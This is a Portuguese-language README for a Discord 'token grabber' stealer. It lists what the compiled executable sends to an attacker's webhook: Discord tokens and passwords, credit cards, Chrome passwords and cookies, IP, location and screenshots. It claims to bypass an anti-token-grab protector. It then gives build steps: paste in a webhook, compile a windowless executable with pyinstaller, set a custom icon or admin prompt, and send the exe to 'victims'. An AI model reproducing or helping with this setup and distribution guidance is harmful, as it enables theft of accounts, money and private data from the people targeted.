<p align="center">
<https://discord.gg/TheeQ4bANN'discord server'=]
</p>

#### Zekry-Token-Grabber was made by
Zekry 

## ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ 🌟Star This Repository If You Liked Zekry Token Grabber!

---

## Instalação

#### ao executar o arquivo, você receberá o seguinte enviado ao seu webhook:
 -  Usuario
 -  Info PC
 -  IP
 -  Cidade
 -  Região
 -  Country
 -  Google Maps Localização
 -  Screenshot do pc
 -  Todos os seus tokens de discord válidos (ignora o protetor anti-token-grab de betterdiscord)
 -  Senha para discord (você obtém a senha deles se eles a atualizarem)
 -  Todo o cartão de crédito (se eles colocarem um)
 -  Todas as suas senhas e cookies do Chrome
> Webhook se parece com isso:

### 📁・Configurando Zekry Token Grabber
1. Comece instalando [python](https://www.python.org/) ofc
2. abra main.py com qualquer editor de código de sua escolha e cole seu webhook na linha 17 ("WEBHOOK_AQUI")]
3. execute o `pre-setup.exe` para que seu arquivo python seja verificado
4. execute o `setup.bat` e deixe-o fazer suas coisas
5. uma janela deve aparecer pedindo o nome .exe e depois de corrigir tudo isso, você deve ter seu .exe
5. envie exe para suas vítimas

### ⚙・Compilando manualmente o código-fonte
Se você não quiser executar build-exe.bat e compilá-lo dessa forma, você pode
Comece abrindo um cmd em seu diretório e digite:
```
pyinstaller --onefile --clean --noconsole main.py
```
substitua main.py pelo nome do arquivo se você o alterou
3 pastas e 1 arquivo serão criados, você pode excluí-los todos, exceto a pasta dist
vá para a pasta dist e lá está o seu exe pronto para ser enviado às vítimas!

### 💾・ Mais Opções
Adicione-os ao comando ao criar o exe, se desejar

|    Pyinstaller Opções 		|
| ------------------------------------ 	|
| `-n name` Nome que o exe terá (o padrão é o arquivo .py)	|
| `-i icon.ico` Ícone que o exe terá (faça `-i NONE` para visual executável normal)	|
| `--clean` Limpe o cache do PyInstaller e remova os arquivos temporários antes de compilar	|
| `--uac-admin` Solicita privilégios de administrador ao executar o exe |
| `--hidden-import MODULO` Nomeie uma importação não visível no código do script. Pode ser usado várias vezes |
